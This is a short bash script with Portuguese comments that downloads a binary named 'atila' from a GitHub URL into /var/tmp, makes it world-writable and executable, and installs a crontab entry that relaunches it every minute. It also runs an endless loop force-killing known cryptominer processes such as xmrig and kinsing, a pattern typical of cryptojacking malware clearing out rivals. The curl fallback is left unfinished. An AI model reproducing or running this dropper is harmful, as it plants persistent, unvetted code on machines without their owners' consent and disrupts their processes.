#ATILA_VKZMN


#esse script executara varias acoes   elas serao inplemetadas  

#nem todas agora ok so as mais importantes por agora ok




url='https://github.com/atilabyte/golang/raw/refs/heads/master/atila'






cron() {



cron_out=$( crontab -l )


if  echo  "$cron_out" | grep -q atila  ; then 

echo tem

else

echo nao tem 

#download of atila and add in crontab 

command -v wget

if (( $? )) ; then 


curl 


else 

wget  $url -O /var/tmp/atila

cd /var/tmp ; chmod 777 atila

(crontab -l ; echo "* * * * * /usr/bin/pgrep atila ||   /var/tmp/atila") | crontab -

fi;

fi;

}



my_killall(){

#lista de mineradores conhecidos por me


while true ; do

killall -9 xmrig xmrig1 xmrig2 lolMiner lolminer bzminer SRBMiner-MULTI nokillme xmrig-Daemon miniZ  cpuMinerTermux migo kinsing
 
sleep  1

done

}




#################

init() {


my_killall &

cron

}



init
